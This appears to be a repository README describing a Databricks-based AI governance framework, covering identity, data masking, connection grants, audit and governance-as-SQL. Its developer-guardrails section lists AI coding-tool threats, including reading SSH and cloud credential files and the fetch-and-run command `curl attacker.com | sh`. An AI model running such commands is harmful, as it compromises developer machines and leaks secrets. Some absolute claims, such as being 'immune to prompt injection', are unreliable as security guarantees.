# Applied AI Governance Framework

## The Problem

AI is changing faster than any governance model can enumerate. New modalities, new tools, new attack surfaces appear weekly. A governance framework that lists specific APIs or tools will be obsolete in months.

What endures are principles. Identity doesn't change. Least privilege doesn't change. Audit requirements don't change. The enforcement mechanisms evolve, but the questions stay the same:

1. **Who is asking?** (Identity)
2. **Can they reach it?** (Network)
3. **Are they allowed?** (Authorization)
4. **What can they do?** (Capability)
5. **What did they do?** (Audit)
6. **Can you prove it?** (Compliance)

Any AI governance architecture that answers these six questions at every layer -- and can absorb new AI capabilities without redesign -- will outlast the tools it governs.

---

## Design Principles

### 1. Govern at the data layer, not the application layer

Applications change. Data governance doesn't. If your access control lives in application code, every new AI tool requires new governance code. If it lives in the data platform, every new AI tool inherits governance automatically.

Row filters, column masks, and connection grants are enforced by the SQL engine. No application can bypass them. No new AI service needs to "integrate" with them -- it just issues SQL and governance fires.

**The test:** Can you add a new AI tool to your stack tomorrow without writing a single line of governance code? If yes, you're governing at the right layer.

### 2. Identity is the invariant

Tools change. Protocols change. Identity is the one constant across every governance decision. Design everything around identity:

- **Human identity** propagates through OBO tokens -- `current_user()` is the human's email at every layer
- **Role identity** maps to service principals via group membership -- `is_member()` evaluates at the SQL engine
- **Service identity** authenticates via M2M credentials -- background jobs, pipelines, audit writers

Every governance decision reduces to: given this identity, is this action allowed on this resource? The mechanism for establishing identity (OAuth, SAML, Federation, PAT) is an implementation detail. The identity itself is the invariant.

### 3. Defense in depth, not defense in one

No single enforcement point is sufficient. Any layer can have bugs, misconfigurations, or bypasses. The architecture must be correct even if one layer fails:

```
Network         Can the request reach the service?
Identity        Who is making the request?
Scope           What capabilities does the token grant?
Application     Does the tool-level RBAC allow this action?
Platform        Does UC allow this identity on this resource?
```

Each layer is independently sufficient to deny. An attacker must compromise ALL layers to succeed. A misconfiguration in any single layer does not expose data.

### 4. Silent enforcement over loud failure

The most secure governance is invisible to the user. Row filters don't return errors -- they return fewer rows. Column masks don't block queries -- they return NULL for sensitive fields. The user never sees an "access denied" on data they shouldn't know exists.

Loud failures (HTTP 403, permission errors) are appropriate for capability boundaries -- you can't call a tool you don't have access to. But within the data layer, silence is the correct behavior. A query that returns 0 rows is governance working, not a bug.

### 5. Audit everything, trust nothing

Platform audit captures what the system sees. Application audit captures what the user intended. Neither is complete alone:

- Platform audit records the SP identity but not the human behind a federated request
- Application audit records the human email but can be tampered with by a compromised app
- Only the correlation of both -- joined on request_id and timestamp -- gives the full chain of custody

Design for forensics, not just monitoring. The question isn't "what happened today" but "can you reconstruct exactly what happened 90 days ago for a specific user on a specific dataset?"

### 6. Govern connections, not just data

Traditional data governance asks: can this identity SELECT from this table? AI governance adds a new question: can this identity call this external service?

UC Connections are the governance primitive for external tool access. `GRANT USE CONNECTION` is the on/off switch. `REVOKE USE CONNECTION` is instant, requires no redeployment, and is audited. This is how you prevent the confused deputy -- a pattern where a privileged service blindly executes requests from untrusted callers.

The confused deputy defense: if an untrusted identity cannot USE the connection, no amount of prompt injection or tool manipulation can exfiltrate data through that connection.

### 7. Make governance declarative

Governance that lives in code is governance that drifts. Governance that lives in SQL is governance that's versionable, auditable, and executable by anyone with the right permissions:

```sql
-- This is the entire access control policy for a role
GRANT USE CATALOG ON CATALOG my_catalog TO `sp-role-sales`;
GRANT USE SCHEMA ON SCHEMA my_catalog.sales TO `sp-role-sales`;
GRANT SELECT ON TABLE my_catalog.sales.opportunities TO `sp-role-sales`;
GRANT USE CONNECTION ON CONNECTION github_api TO `sp-role-executive`;
REVOKE USE CONNECTION ON CONNECTION github_api FROM `sp-role-sales`;
```

No YAML. No policy engines. No deployment pipelines. SQL is the policy language. Unity Catalog is the policy engine. The state is always queryable: `SHOW GRANTS ON ...`.

---

## The Seven Pillars

```
+------------------------------------------------------------------+
|                     Applied AI Governance                         |
+------------------------------------------------------------------+
|                                                                    |
|  [0] Developer       Build-time guardrails for AI coding tools.   |
|      Guardrails      Prevent credential exfiltration, destructive |
|                      operations, and supply chain compromise      |
|                      during development.                          |
|                                                                    |
|  [1] Network         Private connectivity, IP access lists,       |
|      Access          firewall rules, VPC-SC, serverless NCC.      |
|      Controls        The perimeter -- before identity fires.      |
|                                                                    |
|  [2] Identity &      OBO (U2M), M2M, Federation. Three models,   |
|      Access          one governance plane. OAuth scopes enforce   |
|      Control         least privilege per token.                   |
|                                                                    |
|  [3] Data            Row filters, column masks, ABAC governed     |
|      Governance      tags. Enforced by the SQL engine -- no app   |
|                      can bypass, no new tool needs integration.   |
|                                                                    |
|  [4] Tool & API      UC Connections govern external service       |
|      Governance      access. GRANT/REVOKE USE CONNECTION is the   |
|                      on/off switch. Confused deputy defense.      |
|                                                                    |
|  [5] Observability   Platform audit (system tables) + app audit   |
|      & Audit         (custom tables) + MLflow traces. Chain of    |
|                      custody: human -> tool -> SQL -> data.       |
|                                                                    |
|  [6] Policy &        Governance-as-SQL. Declarative, versionable, |
|      Compliance      queryable. No drift between intent and       |
|                      enforcement.                                 |
|                                                                    |
+------------------------------------------------------------------+
```

### Pillar 0: Developer Guardrails

**Question:** Is the AI coding assistant doing something dangerous during development?

The newest attack surface. AI coding tools (Claude Code, Copilot, Cursor) have shell access, file system access, and network access on developer machines. An unguarded AI assistant can:

- Read `~/.ssh/`, `~/.aws/`, `.env` files and exfiltrate credentials
- Execute `curl attacker.com | sh` via obfuscated shell commands
- `git push --force` to shared branches
- Write backdoors into startup scripts

This pillar sits outside the Databricks platform -- it governs the development process itself. Context-aware tool interception (classifying each operation by what it actually does, not what tool it uses) is the pattern. Allow/deny lists don't scale; contextual classification does.

**Future-proof because:** Every new AI coding tool will have the same attack surface -- file access, shell access, network access. The classification model adapts; the threat categories are stable.

### Pillar 1: Network Access Controls

**Question:** Can the request even reach the AI service?

| Control | What it does |
|---------|-------------|
| Private Link / PSC | No public internet path to workspace |
| IP Access Lists | Restrict API/UI to known CIDR ranges |
| Serverless NCC | Private connectivity from serverless compute to customer VNets |
| VPC-SC (GCP) | Data exfiltration prevention at the cloud perimeter |
| NSG / Firewall Rules | Restrict egress from compute to approved destinations |
| Apps Networking | Databricks Apps run in control plane with managed private endpoints |

This is the foundation. If the network doesn't allow it, nothing else matters. Every AI service on Databricks (SQL Warehouse, Model Serving, Genie, Apps) can be fully private -- zero public endpoints.

**Future-proof because:** Network isolation is a physical property, not a software feature. New AI services inherit the workspace's network configuration automatically. You never need to "add firewall rules for Genie" -- it runs on the same private infrastructure.

### Pillar 2: Identity & Access Control

**Question:** Who is making this request, and what capabilities does their token grant?

Three identity models, one governance plane:

| Model | Token Source | `current_user()` | Best For |
|-------|-------------|-------------------|----------|
| **OBO (U2M)** | Apps proxy injects user's scoped token | Human email | Internal apps, interactive |
| **M2M** | SP client credentials | SP application ID | Background jobs, pipelines, audit |
| **Federation** | External IDP JWT exchanged for SP token | SP application ID | Partner portals, external users |

OAuth scopes enforce least privilege per token: `sql`, `genie`, `serving` -- never `all-apis`. The scope is the maximum capability; UC grants are the actual authorization.

**Future-proof because:** Every new Databricks AI service will support OAuth tokens and UC identity. The three models cover all possible caller types (human-with-account, machine, human-without-account). New services don't require new identity patterns.

### Pillar 3: Data Governance

**Question:** Given this identity, what data can they see?

Four layers, all enforced by the SQL engine:

1. **Catalog/Schema privileges** -- `GRANT USE CATALOG`, `GRANT SELECT`
2. **ABAC governed tags** -- dynamic access based on classification tags
3. **Row filters** -- `is_member('west_sales')` restricts rows by group
4. **Column masks** -- `CASE WHEN is_member('finance') THEN margin_pct ELSE NULL END`

The key insight: these fire automatically for every query, regardless of which AI service issues the SQL. Genie, Agent Bricks, custom MCP servers, Model Serving -- all get the same governance because all ultimately issue SQL.

**Future-proof because:** Any AI service that reads data must go through the SQL engine. The SQL engine enforces governance. New AI services inherit data governance on day one, with zero integration work.

### Pillar 4: Tool & API Governance

**Question:** Can this identity use this external tool or service?

UC Connections are the governance primitive:

```sql
-- Executive can access GitHub
GRANT USE CONNECTION ON CONNECTION github_api TO `sp-role-executive`;

-- Sales cannot
REVOKE USE CONNECTION ON CONNECTION github_api FROM `sp-role-sales`;
```

This prevents the confused deputy attack: a privileged MCP server cannot be tricked into calling external APIs on behalf of an unauthorized user, because the SQL engine checks `USE CONNECTION` before the HTTP request fires.

Two layers of defense:
1. **Application RBAC** -- tool-level access matrix (which roles can call which tools)
2. **Platform enforcement** -- UC `USE CONNECTION` (which identities can use which connections)

Either layer is sufficient to deny. Both must pass for access.

**Future-proof because:** The pattern "can this identity call this external service?" applies to any external integration -- REST APIs, MCP servers, database connections, SaaS tools. The connection type changes; the governance primitive doesn't.

### Pillar 5: Observability & Audit

**Question:** What happened, and can you prove it?

Three complementary layers:

| Layer | Source | What it captures |
|-------|--------|-----------------|
| **Platform audit** | `system.access.audit` | SQL queries, UC operations, identity, timestamp |
| **App audit** | Custom Delta table | Tool calls, human email (behind SP), latency, errors |
| **MLflow traces** | MLflow experiment | Full request/response, spans, tags, token usage |

The chain of custody: `human -> tool -> SQL -> data`, correlated across all three layers by `request_id`.

Alerts fire on: error rate spikes, P95 latency breaches, safety score drops, unusual access patterns.

**Future-proof because:** Every new AI service writes to `system.access.audit`. The platform audit surface grows automatically. Application audit is a pattern you implement once (decorator/middleware) and apply to every tool.

### Pillar 6: Policy & Compliance

**Question:** Is the governance codified, repeatable, and provable?

Governance-as-SQL means:
- **Queryable state**: `SHOW GRANTS ON TABLE ...` returns the current policy
- **Versionable**: SQL grant scripts in git, reviewed via PR
- **Auditable**: Every `GRANT`/`REVOKE` is recorded in `system.access.audit`
- **Instant**: Changes take effect immediately, no redeployment
- **Declarative**: The policy IS the SQL, not a translation of policy into code

Federation policies, row filter functions, column mask functions, connection grants -- all are SQL objects managed through Unity Catalog. The governance state is always introspectable.

**Future-proof because:** SQL has been the lingua franca of data access control for 50 years. It will outlast any policy engine, any YAML schema, any proprietary policy language.

---

## The Adaptability Model

The framework is designed to absorb change at every layer:

| What changes | What stays the same | How it adapts |
|---|---|---|
| New AI service (e.g., Databricks adds a new agent type) | UC governance, identity model, audit surface | New service issues SQL -- governance fires automatically |
| New external tool (e.g., new MCP server) | Connection governance, confused deputy defense | `CREATE CONNECTION` + `GRANT USE CONNECTION` -- one SQL command |
| New identity source (e.g., new IDP) | Token exchange, SP mapping, UC groups | Update federation policy -- same SP architecture, same UC groups |
| New compliance requirement (e.g., new data classification) | ABAC framework, governed tags | Add tag + row filter -- no code changes |
| New attack surface (e.g., prompt injection via tool) | Defense in depth -- each layer denies independently | UC enforcement at SQL layer is immune to prompt injection |
| New AI coding tool | Developer guardrail patterns | Context-aware classification adapts -- threat categories are stable |

The pattern: **new capabilities are additive, not architectural**. You never redesign the governance framework -- you extend it by adding a connection, a grant, a tag, or a policy.

---

## Where Databricks Fits

Databricks is not a governance vendor. It's a data and AI platform that happens to have governance built into its execution layer. This distinction matters:

- **Unity Catalog is not a policy engine bolted on top** -- it's the execution layer. Row filters fire inside the SQL engine, not in a proxy. They cannot be bypassed.
- **OAuth scopes are not an authorization system** -- they're a capability ceiling. UC grants are the actual authorization. Scopes limit what the token CAN do; grants determine what the identity MAY do.
- **`system.access.audit` is not a logging feature** -- it's a record of every governance decision the platform made. It's the ground truth.

The competitive moat: no other platform has a single governance plane that spans SQL, AI agents, model serving, vector search, external connections, and serverless compute. Competitors have pieces (Snowflake has data governance, Azure has network controls, AWS has IAM). Databricks has the unified plane.

---

## Using This Repository

This repository is organized around the pillars:

| Pillar | Key Documents |
|--------|--------------|
| Identity & Access | [Authentication](identity/authentication.md), [Authorization](identity/authorization.md), [Federation](identity/federation.md) |
| Data Governance | [UC Authorization](data-governance/uc-authorization.md), [UC Policy Design](data-governance/uc-policy-design.md) |
| Tool Governance | [AI Gateway Patterns](tool-governance/ai-gateway-patterns.md), [Federation](identity/federation.md) |
| Observability | [Audit Reference](observability/audit-reference.md) |
| Architecture | [Orchestration Architecture](tool-governance/orchestration-architecture.md), [Authorization](identity/authorization.md) |

Network access controls and developer guardrails are covered in companion resources:
- Network: [bhavink/databricks](https://github.com/bhavink/databricks) (multi-cloud Private Link, VPC-SC, NCC patterns)
- Developer guardrails: future work

---

*The tools will change. The principles won't. Govern the invariants.*
